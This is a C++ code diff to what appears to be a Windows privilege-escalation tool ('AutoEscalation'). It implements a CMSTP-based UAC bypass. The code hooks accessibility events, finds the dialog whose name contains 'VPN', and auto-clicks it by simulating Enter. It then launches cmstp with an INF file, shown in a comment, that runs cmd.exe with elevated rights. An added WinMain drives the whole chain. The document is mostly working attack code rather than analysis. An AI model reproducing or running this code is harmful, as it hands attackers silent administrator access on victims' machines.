@@ -1,6 +1,12 @@
 #include "pch.h"
 #include "framework.h"
 #include "AutoEscalation.h"
+#include <oleacc.h>  // Required for AccessibleObjectFromEvent
+#include <windows.h>
+#pragma comment(lib, "Oleacc.lib")
+#include <cstdio>
+#include <iostream>
+#include <string>
 
 ESCALATION_API BOOL CALLBACK exmButtonCallback(
 	_In_ HWND   hwnd
@@ -16,6 +22,7 @@ ESCALATION_API BOOL CALLBACK exmButtonCallback(
 	//	hwndButton = GetDlgItem(hwnd, 1117);
 
 	if (hwndButton) {
+		// Simulate pressing enter
 		SendMessage(hwnd, WM_NEXTDLGCTL, (WPARAM)hwndButton, TRUE);
 		PostMessage(hwnd, WM_KEYDOWN, (WPARAM)0x0D, MAKELPARAM(0, 0)); // client relative
 		SendMessage(hwnd, WM_NCHITTEST, NULL, MAKELPARAM(0, 0)); // system relative
@@ -32,21 +39,44 @@ ESCALATION_API void CALLBACK exmHandleWinEvent(HWINEVENTHOOK hook, DWORD event, 
 	LONG idObject, LONG idChild,
 	DWORD dwEventThread, DWORD dwmsEventTime)
 {
+	
 	IAccessible* pAcc = NULL;
-	VARIANT varChildl;
-	//HWND hwndNull;
+	VARIANT varChild;
+	HWND hwndNull;
 	HRESULT hr = AccessibleObjectFromEvent(hwnd, idObject, idChild, &pAcc, &varChild);
 	if ((hr == S_OK) && (pAcc != NULL))
 	{
 		BSTR bstrName;
 		pAcc->get_accName(varChild, &bstrName);
-		if (wcsncmp(bstrName, L"Very legit thing", 16) == 0)
+
+		// Debug: Print string length
+		/*
+		int len = SysStringLen(bstrName);
+		wchar_t debugInfo[512];
+		//swprintf_s(debugInfo, L"String: '%s'\nLength: %d", bstrName, len);
+		//MessageBoxW(NULL, debugInfo, L"Debug Info", MB_OK);
+
+		// Print each character code to check for hidden characters
+		std::wstring charCodes;
+		for (int i = 0; i < len; i++) {
+			wchar_t code[32];
+			swprintf_s(code, L"%d ", (int)bstrName[i]);
+			charCodes += code;
+		}
+		*/
+		//MessageBoxW(NULL, charCodes.c_str(), L"Character Codes", MB_OK);
+		
+		char buffer[256];
+		WideCharToMultiByte(CP_UTF8, 0, bstrName, -1, buffer, sizeof(buffer), NULL, NULL);
+		//MessageBoxA(NULL, buffer, "Window Name", MB_OK);
+		if (wcsstr(bstrName, L"VPN") != NULL)  // This will check if "Command" appears anywhere in bstrName
 		{
-			ILog("Got window, performing callback");
+			//printf("Got window, performing callback");
+			//MessageBox(NULL, L"Got window, performing callback!", L"WinMain Example", MB_OK);
 			exmButtonCallback(hwnd);
 			//exmButtonCallback(hwndNull);
 		}
-		//ILog("%S\n", bstrName);
+		//printf("%S\n", bstrName);
 		SysFreeString(bstrName);
 		pAcc->Release();
 	}
@@ -74,14 +104,8 @@ ESCALATION_API LPVOID GetMainModuleBaseSecure()
 // Initializes COM and sets up the event hook.
 ESCALATION_API HWINEVENTHOOK exmInitializeMSAA(std::wstring& sPayloadPath)
 {
-#ifdef _DEBUG
-	FILE* newstdin = nullptr;
-	FILE* newstdout = nullptr;
-	FILE* newstderr = nullptr;
-	freopen_s(&newstdin, "CONIN$", "r", stdin);
-	freopen_s(&newstdout, "CONOUT$", "w", stdout);
-	freopen_s(&newstderr, "CONOUT$", "w", stderr);
-#endif
+
+
 	CMSTP cmstp;
 	PCMSTP p_cmstp = &cmstp;
 
@@ -96,7 +120,7 @@ ESCALATION_API HWINEVENTHOOK exmInitializeMSAA(std::wstring& sPayloadPath)
 	LPWSTR ncPayloadPath = new WCHAR[commandLine.length() + 1];
 	wcscpy_s(ncPayloadPath, commandLine.length() + 1, commandLine.c_str());
 
-	ILog("Payload path: %ls\n", ncPayloadPath);
+	//ILog("Payload path: %ls\n", ncPayloadPath);
 	
 	CoInitialize(NULL);
 	HWINEVENTHOOK hwekWND = SetWinEventHook(
@@ -105,14 +129,78 @@ ESCALATION_API HWINEVENTHOOK exmInitializeMSAA(std::wstring& sPayloadPath)
 		exmHandleWinEvent,     // The callback.
 		0, 0,                  // Process and thread IDs of interest (0 = all)
 		WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS); // Flags.
+	/*
 	if (hwekWND != 0)
+	{
 		ILog("Windows event hook set\n");
+		MessageBox(NULL, L"Hook set!", L"WinMain Example", MB_OK);
+	}
 	else
+	{
+		MessageBox(NULL, L"Failed to set hook!", L"WinMain Example", MB_OK);
 		ILog("Failed to set hook\n");
-	CreateProcess(NULL, ncPayloadPath, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+	}
+	*/
+	CreateProcessW(NULL, ncPayloadPath, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+	//MessageBox(NULL, L"Process created!", L"WinMain Example", MB_OK);
+
+	Sleep(15000);
 
 	delete[] ncPayloadPath;
 	return hwekWND;
+}
+
+// WinMain calling exmInitializeMSAA
+int WINAPI WinMain(
+	HINSTANCE hInstance,     // Handle to the current instance
+	HINSTANCE hPrevInstance, // Handle to the previous instance (always NULL in modern Windows)
+	LPSTR lpCmdLine,         // Command-line arguments as a single string
+	int nCmdShow             // Flag for how the window should be shown
+) {
+	std::wstring sPayloadPath = L"C:\\temp\\test.inf";
+
+	/* Whereas the INF File looks like this:
+	
+	
+[version]
+Signature=$chicago$
+AdvancedINF=2.5
+ 
+[DefaultInstall]
+CustomDestination=CustInstDestSectionAllUsers
+RunPreSetupCommands=RunPreSetupCommandsSection
+ 
+[RunPreSetupCommandsSection]
+C:\windows\system32\cmd.exe
+taskkill /IM cmstp.exe /F
+ 
+[CustInstDestSectionAllUsers]
+49000,49001=AllUSer_LDIDSection, 7
+ 
+[AllUSer_LDIDSection]
+""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"
+ 
+[Strings]
+ServiceName=""VPN""
+ShortSvcName=""VPN""
+	
+	
+	
+	
+	
+	*/
+
+	/*
+	std::cout << "Call it" << std::endl; // Better than printf
+	fflush(stdout);  // Ensure output is flushed
+	MessageBox(NULL, L"Call it!", L"WinMain Example", MB_OK);
+	*/
+	exmInitializeMSAA(sPayloadPath);
+	//MessageBox(NULL, L"Done!", L"WinMain Example", MB_OK);
+
+	//std::cout << "Done" << std::endl;
+	//fflush(stdout);  // Ensure output appears before exit
+	return 0;
 }
 
 // Unhooks the event and shuts down COM.
